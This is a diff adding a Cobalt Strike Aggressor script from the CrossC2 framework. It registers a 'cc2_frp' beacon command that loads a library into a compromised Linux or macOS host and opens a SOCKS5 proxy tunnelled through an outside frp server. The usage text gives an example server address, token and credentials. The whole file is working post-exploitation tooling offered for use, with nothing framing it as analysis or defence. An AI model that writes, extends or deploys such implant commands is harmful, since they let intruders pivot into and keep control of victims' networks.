@@ -1,0 +1,41 @@
+
+include(script_resource("CrossC2Kit.cna"));
+
+sub printUsage_frp {
+    blog($1, "\nCrossC2 proxy frp -  Start SOCKS5 {TCP/KCP(UDP)}\nby: daybr4ak\nUsage: cc2_frp <linux(32)/osx> <sip:sport> <token> <protocol> <user:pass:rport>\n\n\tsip: \tfrp server ip\n\tsport: \tfrp server port\n\ttoken: \tfrp token\n\tprotocol: \ttcp / kcp\n\tuser: \tsocks5 username\n\tpass: \tsocks5 password\n\trport: \tsocks5 port\nEx:\n\tcc2_frp linux 112.12.11.12:8000 token1234 tcp admin:passwd:8001");
+}
+
+ssh_alias cc2_frp {
+    $taskName = "cc2_frp"; # taskName
+    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "info"; # info -> normal message
+
+    $beaconid = $1;
+    $arch = $2;
+    $server_host = $3;
+    $token = $4;
+    $protocol = $5;
+    $bindInfo = $6;
+    $transportArg = $server_host . "^" . $token . "^" . $protocol . "^" . $bindInfo;
+
+    if ($arch eq "osx") {
+        $loadlib = "proxy/frp/crossc2_frp.dylib";
+    } else if ($arch eq "linux32") {
+        $loadlib = "proxy/frp/crossc2_frp32.so";
+    } else if ($arch eq "linux") {
+        $loadlib = "proxy/frp/crossc2_frp.so";
+    } else {
+        berror($beaconid, "*[error]: system");
+        printUsage_frp($beaconid);
+        return;
+    }
+    if ($server_host && $token && $protocol && $bindInfo) {
+        blog($beaconid, "cc2_frp: " . $server_host . " " . $bindInfo);
+        bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+    } else {
+        printUsage_frp($beaconid);
+    }
+
+}
+
+ssh_command_register("cc2_frp", "CrossC2 proxy frp  -  Start Linux/MacOS SOCKS5 proxy {TCP/KCP(UDP)}", "\nby: daybr4ak\nUsage: cc2_frp <linux(32)/osx> <sip:sport> <token> <protocol> <user:pass:rport>\n\n\tsip: \tfrp server ip\n\tsport: \tfrp server port\n\ttoken: \tfrp token\n\tprotocol: \ttcp / kcp\n\tuser: \tsocks5 username\n\tpass: \tsocks5 password\n\trport: \tsocks5 port\nEx:\n\tcc2_frp linux 112.12.11.12:8000 token1234 tcp admin:passwd:8001");
